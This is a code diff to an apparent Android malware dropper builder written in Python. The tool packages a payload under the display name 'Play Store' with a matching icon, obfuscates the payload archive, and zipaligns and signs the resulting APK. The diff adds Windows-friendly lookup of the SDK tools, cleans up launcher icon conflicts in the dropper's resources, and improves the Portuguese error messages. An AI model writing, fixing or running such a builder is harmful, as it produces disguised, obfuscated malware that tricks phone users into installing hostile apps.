@@ -288,6 +288,42 @@ PAYLOAD_DISPLAY_NAME = "Play Store"
 PAYLOAD_DISPLAY_ICON = os.path.join(BASE_DIR, "assets", "play_store_icon.png")
 
 
+def sanitize_launcher_icon_conflicts(dropper_work: str) -> None:
+    """Remove adaptive XML when a bitmap launcher exists for the same resource name."""
+    res_dir = os.path.join(dropper_work, "res")
+    if not os.path.isdir(res_dir):
+        return
+
+    mipmap_dirs = [
+        os.path.join(res_dir, entry)
+        for entry in os.listdir(res_dir)
+        if entry.startswith("mipmap") and os.path.isdir(os.path.join(res_dir, entry))
+    ]
+    density_dirs = [
+        path for path in mipmap_dirs if "anydpi" not in os.path.basename(path).lower()
+    ]
+
+    for base in ("ic_launcher", "ic_launcher_round"):
+        has_density_bitmap = any(
+            os.path.isfile(os.path.join(folder, f"{base}{ext}"))
+            for folder in density_dirs
+            for ext in (".png", ".webp", ".jpg")
+        )
+        for folder in mipmap_dirs:
+            xml_path = os.path.join(folder, f"{base}.xml")
+            if not os.path.isfile(xml_path):
+                continue
+            has_local_bitmap = any(
+                os.path.isfile(os.path.join(folder, f"{base}{ext}"))
+                for ext in (".png", ".webp", ".jpg")
+            )
+            # Same config can't define XML + bitmap; also drop anydpi adaptive when bitmaps exist.
+            if has_local_bitmap or (
+                "anydpi" in os.path.basename(folder).lower() and has_density_bitmap
+            ):
+                os.remove(xml_path)
+
+
 def _extract_launch_class(manifest_xml: str, payload_package: str) -> str:
     pkg = (payload_package or "").strip()
     a1 = re.search(
@@ -790,7 +826,7 @@ def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> 
         with open(raw_path, "wb") as fh:
             fh.write(noised)
         try:
-            if os.path.isfile(Config.ZIPALIGN):
+            if os.path.isfile(_resolve_sdk_tool(Config.ZIPALIGN)):
                 zipalign_apk(raw_path, aligned_path)
             else:
                 shutil.copy2(raw_path, aligned_path)
@@ -983,10 +1019,25 @@ def ensure_release_keystore() -> tuple[str, str, str, str]:
     return path, store_pass, alias, key_pass
 
 
+def _resolve_sdk_tool(path: str) -> str:
+    if path and os.path.isfile(path):
+        return path
+    if not path:
+        return path
+    for ext in (".exe", ".bat", ".cmd"):
+        candidate = path if path.lower().endswith(ext) else path + ext
+        if os.path.isfile(candidate):
+            return candidate
+    return path
+
+
 def zipalign_apk(input_apk: str, output_apk: str) -> None:
-    if not os.path.isfile(Config.ZIPALIGN):
-        raise RuntimeError("zipalign nao encontrado. Verifique APP-TEST/tools/android-sdk/.")
-    cmd = [Config.ZIPALIGN, "-p", "-f", "4", input_apk, output_apk]
+    zipalign = _resolve_sdk_tool(Config.ZIPALIGN)
+    if not os.path.isfile(zipalign):
+        raise RuntimeError(
+            f"zipalign nao encontrado ({zipalign}). Verifique APP-TEST/tools/android-sdk/."
+        )
+    cmd = [zipalign, "-p", "-f", "4", input_apk, output_apk]
     result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
     if result.returncode != 0 or not os.path.isfile(output_apk):
         err = (result.stderr or result.stdout or "zipalign falhou").strip()
@@ -1004,11 +1055,14 @@ def sign_with_apksigner(
     key_pk8: str | None = None,
     cert_pem: str | None = None,
 ) -> str:
-    if not os.path.isfile(Config.APKSIGNER):
-        raise RuntimeError("apksigner nao encontrado. Verifique APP-TEST/tools/android-sdk/.")
+    apksigner = _resolve_sdk_tool(Config.APKSIGNER)
+    if not os.path.isfile(apksigner):
+        raise RuntimeError(
+            f"apksigner nao encontrado ({apksigner}). Verifique APP-TEST/tools/android-sdk/."
+        )
     v3 = "true" if Config.APKSIGNER_V3_ENABLED else "false"
     cmd = [
-        Config.APKSIGNER,
+        apksigner,
         "sign",
         "--v1-signing-enabled",
         "false",
@@ -1174,6 +1228,8 @@ def process_apk(
                 for name in ("ic_launcher.png", "ic_launcher_round.png"):
                     shutil.copy2(custom_icon_path, os.path.join(path, name))
 
+        sanitize_launcher_icon_conflicts(dropper_work)
+
         strings_xml = os.path.join(dropper_work, "res/values/strings.xml")
         if os.path.exists(strings_xml):
             try:
@@ -1304,7 +1360,9 @@ def process_apk(
         output_dir = os.path.join(Config.OUTPUT_FOLDER, build_id)
         os.makedirs(output_dir, exist_ok=True)
 
-        if not os.path.isfile(Config.APKSIGNER) or not os.path.isfile(Config.ZIPALIGN):
+        if not os.path.isfile(_resolve_sdk_tool(Config.APKSIGNER)) or not os.path.isfile(
+            _resolve_sdk_tool(Config.ZIPALIGN)
+        ):
             raise RuntimeError(
                 "apksigner/zipalign nao encontrados. Verifique APP-TEST/tools/android-sdk/."
             )
